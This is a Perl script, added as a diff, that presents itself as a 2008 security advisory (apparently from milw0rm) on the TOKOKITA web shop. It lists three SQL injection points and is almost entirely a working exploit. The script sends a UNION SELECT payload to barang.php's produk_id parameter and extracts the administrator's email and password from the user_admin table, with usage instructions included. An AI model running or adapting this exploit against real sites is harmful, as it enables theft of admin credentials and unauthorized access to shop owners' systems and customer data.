@@ -1,0 +1,61 @@
+#!/usr/bin/perl
+# k1tk4t Public Security Advisory
+# ////////////////////////////////////////////////////////////
+# TOKOKITA Multiple Remote SQL Injection 
+# Demosite	: http://www.tokokita.net/toko/
+# Vendor	: http://www.tokokita.com/
+# Kutu		: 1. catlist.php?cat_id=[Blind SQLi]
+#		  2. catlist_detail.php?cat_id=[Blind SQLi]
+#	          3. barang.php?produk_id=[SQLi]
+# Terimakasih untuk ;
+# str0ke,DNX,n0c0py,L41n,
+# NTOS-Team->[fl3xu5,opt1lc,sakitjiwa],
+# eCHo->[y3dips,K-159,lirva32,dan staff lainnya] 
+use LWP::UserAgent;
+
+if ( !$ARGV[1] ) {
+	print "\n //////////////////////////////////////////////////////////////////";
+	print "\n //                      ..::> k1tk4t <::..                      //";
+	print "\n // TOKOKITA (barang.php produk_id) Remote SQL Injection Exploit //";
+	print "\n //////////////////////////////////////////////////////////////////";
+	print "\n[!] ";
+	print "\n[!] Penggunaan : perl tokokita.pl [Site] [Path]";
+	print "\n[!] Contoh     : perl tokokita.pl localhost /toko/";
+	print "\n[!] ";
+	print "\n";
+	exit;
+}
+$site   = $ARGV[0];
+$path   = $ARGV[1];
+$sqlinj = "union+
+select+
+null,
+null,
+null,
+concat(0x6b3174,email,0x316e),
+null,
+concat(0x6b3474,password,0x307574),
+null,
+null,
+null,
+null,
+null+
+from+
+user_admin/*";    
+$expl = "http://" . $site . $path . "barang.php?produk_id=-9+"
+. $sqlinj;
+$www  = new LWP::UserAgent;
+print "\n\n [!] Injeksi SQL \n";
+$res = $www->get($expl) or err ();
+$hasil = $res->content;
+if ( $hasil =~ /k1t(.*?)1n/ ) {
+	print "\n [+] Username      : $1";
+	$hasil =~ /k4t(.*?)0ut/, print "\n [+] Password      : $1";
+	print "\n\n";
+} 
+else {
+	print "\n [-] Exploit gagal ;)";
+	exit();
+}
+
+# milw0rm.com [2008-06-24]
